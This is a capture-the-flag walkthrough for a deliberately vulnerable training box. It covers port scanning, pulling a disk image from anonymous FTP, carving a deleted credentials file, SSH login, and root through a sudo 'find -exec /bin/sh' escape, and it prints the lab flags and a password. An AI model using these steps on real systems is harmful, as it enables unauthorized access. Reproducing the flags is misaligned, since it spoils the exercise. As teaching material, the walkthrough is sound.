recovery

Easy Linux box: service enumeration → forensic recovery of a deleted file → a sudo misconfiguration for root.

Step 1 / 5
⚠️ Training target. Run host-only. Never bridge it to a real network or the internet. Every weakness below is intentional and scoped to exactly these flags — nothing else is exploitable.

Goal. Capture the user and root flags. Here the user flag is recovered through disk forensics — the whole point of the first machine.

Scope. Only attack the IP you were given.

Scenario & overview

Recovery Corp decommissioned an old workstation and staged a disk backup on one of its servers "for the IT audit" — nobody checked what that backup still contained. The candidate gets only the target IP.

The walkthrough

1

Enumerate the services

service enumeration

Full port scan with service/version detection.

$ nmap -sC -sV -p- <target-ip>
21/tcp  ftp     vsftpd     (anonymous login allowed)
22/tcp  ssh     OpenSSH
80/tcp  http    Apache httpd

Why it works

  • -p- scans all 65535 ports; -sV fingerprints versions and -sC runs default scripts — the FTP script flags anonymous login, your first lead.
2

Pull the disk image

exposed services

The web root advertises a decommissioned workstation backup (same file is on anonymous FTP).

$ wget http://<target-ip>/disk_backup.img
$ ftp <target-ip>            # user: anonymous — press Enter for password
ftp> get pub/disk_backup.img

Why it works

  • A "backup" is rarely just data — disk images carry deleted files in unallocated space. Anonymous FTP and an open web dir need no credentials.
3

Recover the deleted file (forensics)

disk forensics

The image once held a credentials.txt that was deleted. Deleting a file does not wipe its data blocks, so recover it — the quickest check:

$ strings disk_backup.img | grep -iE 'FLAG|pass|ssh'

Or carve it with any forensic tool:

$ foremost -i disk_backup.img -o out/     # carves deleted files
$ extundelete disk_backup.img --restore-all

The recovered note holds the SSH credentials and the user flag:

SSH : jdoe
Pass: sunshine2019
FLAG{f0r3ns1c_c4rv1ng_r3c0v3ry}
userFLAG{f0r3ns1c_c4rv1ng_r3c0v3ry}

Why it works

  • On ext filesystems, rm only unlinks the entry and frees the inode — the data blocks keep their contents until overwritten. strings reads them raw; carvers rebuild whole files from headers.
4

Get a shell

using credentials
$ ssh jdoe@<target-ip>       # password: sunshine2019

Why it works

  • Credentials pulled from "dead" storage are still live on the running system — password hygiene, not the disk, is the failure.
5

Escalate to root

privilege escalation

Enumerate sudo rights, then abuse find (a classic GTFOBins escape).

$ sudo -l
    (root) NOPASSWD: /usr/bin/find
$ sudo find . -exec /bin/sh \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
FLAG{sud0_f1nd_g1v3s_r00t}
rootFLAG{sud0_f1nd_g1v3s_r00t}

Why it works

  • sudo runs find as root, and -exec launches a child that inherits root; -quit stops after the first match so you drop straight into the shell.

Both flags

userFLAG{f0r3ns1c_c4rv1ng_r3c0v3ry} rootFLAG{sud0_f1nd_g1v3s_r00t}

Lesson. "Deleting" a file is not erasing it, and decommissioned media must be wiped. Pair that with least-privilege sudo rules and this whole chain disappears.
